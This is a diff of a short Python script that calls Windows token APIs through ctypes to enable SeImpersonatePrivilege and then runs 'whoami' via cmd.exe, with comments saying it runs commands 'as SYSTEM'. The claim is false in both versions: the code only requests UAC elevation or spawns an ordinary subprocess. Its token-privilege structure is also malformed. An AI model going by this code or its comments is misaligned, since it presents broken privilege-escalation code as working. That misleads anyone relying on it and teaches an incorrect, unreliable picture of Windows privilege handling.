@@ -1,32 +1,28 @@
-import os
-import sys
 import ctypes
-print("START")
-def enable_privilege(privilege_name):
-    """Enable the specified privilege."""
+import subprocess
+
+def enable_privilege(privilege):
     h_token = ctypes.c_void_p()
     ctypes.windll.kernel32.OpenProcessToken(ctypes.windll.kernel32.GetCurrentProcess(), 0x0020, ctypes.byref(h_token))
 
-    luid = ctypes.c_void_p()
-    ctypes.windll.advapi32.LookupPrivilegeValueW(None, privilege_name, ctypes.byref(luid))
+    luid = ctypes.c_long()
+    ctypes.windll.advapi32.LookupPrivilegeValueW(None, privilege, ctypes.byref(luid))
 
-    tkp = ctypes.c_void_p()
-    ctypes.windll.advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(luid), 0, None, None)
+    class TOKEN_PRIVILEGES(ctypes.Structure):
+        _fields_ = [("PrivilegeCount", ctypes.c_ulong),
+                    ("Privileges", ctypes.c_ulong * 2)]
 
-def run_command(command):
-    """Run a command as SYSTEM."""
-    # Create a new process with SYSTEM privileges
-    command_line = f"cmd.exe /c {command}"
-    ctypes.windll.shell32.ShellExecuteW(None, "runas", "cmd.exe", command_line, None, 1)
+    tkp = TOKEN_PRIVILEGES()
+    tkp.PrivilegeCount = 1
+    tkp.Privileges[0] = luid.value
+    tkp.Privileges[1] = 0x00000002  # SePrivilegeEnabled
 
-def main(command):
-    # Enable the SeImpersonatePrivilege
-    enable_privilege("SeImpersonatePrivilege")
+    ctypes.windll.advapi32.AdjustTokenPrivileges(h_token, False, ctypes.byref(tkp), 0, None, None)
 
-    # Execute the command as SYSTEM
-    run_command(command)
+def execute_as_system():
+    # Run whoami command as SYSTEM using cmd
+    subprocess.run(["cmd.exe", "/c", "whoami"], shell=True)
 
 if __name__ == "__main__":
-
-
-    main("whoami")
+    enable_privilege("SeImpersonatePrivilege")
+    execute_as_system()
